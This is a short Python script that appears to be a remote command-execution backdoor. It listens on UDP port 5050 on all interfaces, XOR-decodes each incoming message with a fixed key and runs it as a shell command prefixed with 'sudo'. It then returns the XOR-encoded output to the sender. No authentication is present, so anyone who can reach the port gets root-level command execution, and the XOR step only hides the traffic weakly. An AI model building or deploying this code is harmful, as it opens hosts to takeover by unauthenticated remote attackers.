import socket
import subprocess


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('0.0.0.0', 5050))
please = 'sudo '
print('Start Server')

def shifrator(message):
    crypt = ''
    key = 100
    for i in message:
        crypt += chr(ord(i) ^ key)
    print(crypt)
    return crypt


def comands(comand):
   output = subprocess.run(please+comand,
                           stdout=subprocess.PIPE,
                           stdin=subprocess.PIPE,
                           universal_newlines=True,
                           shell=True).stdout
   return output



while 1:
    data, addres = sock.recvfrom(1024)
    print(addres[0], addres[1])
    data = data.decode('utf-8')
    data = shifrator(data)
    result = comands(data)
    print(result)
    ack = shifrator(result)
    print(ack)
    sock.sendto(ack.encode('utf-8'), addres)